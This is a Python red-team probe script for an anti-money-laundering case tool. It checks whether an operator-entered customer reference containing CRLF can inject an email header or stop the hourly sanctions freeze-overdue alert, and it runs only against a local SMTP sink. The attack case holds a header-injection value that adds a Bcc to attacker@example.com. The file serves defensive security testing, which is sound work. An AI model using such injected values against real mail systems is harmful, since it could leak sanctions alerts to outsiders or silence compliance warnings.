"""Red-team 2026-10-06: can an operator-entered customer reference suppress the hourly TFS freeze-overdue alert?
mail.send_freeze_obligation_alert puts customer_reference in an EmailMessage Subject outside its try/except.
LOCAL ONLY. Needs a local throw-away SMTP sink on 127.0.0.1:2525, e.g.
    python3.11 -m smtpd -c DebuggingServer -n 127.0.0.1:2525      (no mail leaves the machine)
"""
import os
os.environ["AMLKIT_SMTP_HOST"] = "127.0.0.1"; os.environ["AMLKIT_SMTP_PORT"] = os.environ.get("SINK_PORT", "2525"); os.environ["AMLKIT_SMTP_USE_TLS"] = "0"
exec(open(os.path.join(os.path.dirname(__file__),'probe_e2e.py')).read().split("c = mk()")[0])
import logging; logging.disable(logging.CRITICAL)
from amlkit.cases import manager
from amlkit.cases.scheduler import run_freeze_obligation_check
def scenario(label, refs):
    c = mk()
    c.execute("UPDATE datasets SET last_refresh=?, entity_count=5", (utcnow(),))
    c.execute("INSERT INTO operators (org_id,name,email,password_hash,role,is_active,email_verified_at,created_at) VALUES (1,'mlro','mlro@t.ae','x','mlro',1,?,?)", (utcnow(), utcnow())); c.commit()
    for ref in refs:
        r = manager.onboard(c, org_id=1, reference=ref, full_name="MOHAMMAD DAWOOD MUZAMMIL", actor="redteam")
        manager.create_freeze_obligation(c, 1, r.customer_id, alert_id=None, obligation_type="sanctions", risk_category="high", identified_by="redteam", notes="probe")
    c.commit(); c.execute("UPDATE freeze_obligations SET identified_at=datetime('now','-3 days')"); c.commit()
    res = run_freeze_obligation_check(c)
    state = [(r[0], bool(r[1])) for r in c.execute("select id, overdue_notified_at is not null from freeze_obligations order by id")]
    print(f" {label}\n   refs={refs}\n   newly_notified={res['newly_notified']} failures={res['failures']}\n   alerted (id, sent): {state}")
scenario("CONTROL: three ordinary references", ["REF-1", "REF-2", "REF-3"])
scenario("ATTACK: one reference contains CRLF", ["REF-1", "REF-A\r\nBcc: attacker@example.com", "REF-3"])
